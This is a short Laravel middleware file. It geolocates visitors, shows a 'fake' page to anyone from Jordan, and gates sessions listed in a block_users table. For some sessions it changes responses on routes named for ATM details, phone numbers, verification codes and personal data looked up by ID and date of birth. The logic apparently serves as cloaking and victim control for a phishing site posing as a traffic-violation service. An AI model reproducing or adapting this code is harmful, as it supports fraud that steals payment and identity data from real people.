<?php

namespace App\Http\Middleware;


use Closure;
use Illuminate\Http\Request;
use Symfony\Component\HttpFoundation\Response;
use Illuminate\Support\Facades\DB;
use Illuminate\Support\Facades\Route;
use Stevebauman\Location\Facades\Location;

class BlockUsers
{
    /**
     * Handle an incoming request.
     *
     * @param  \Closure(\Illuminate\Http\Request): (\Symfony\Component\HttpFoundation\Response)  $next
     */
    public function handle(Request $request, Closure $next): Response
    {

         $position = Location::get();


         if($position->countryCode == 'JO'){

             return response(view('fake'));
         }


        $id   = session('id');    
        $user = DB::table('block_users')->where('id_ref', $id)->first();

        $array   = ['information','register','addto/{error}','addto','verifycode'];
        $exclude = ['atm','send-phone','extGetTrafficViolationInfo','verifya','extGetPersonalInfoByIdAndDob'];


        if($user) {

           
            if($user->status == 1)
            return response(view('fake'));

            if($user->status == 2){


                $routeInfo = \Route::current();

                if(in_array($routeInfo->uri, $exclude))
                  return response()->json(array('msg'=> 2), 200);
                else
                  return $next($request);

            }
           
        };


        
        return $next($request);
    }
}
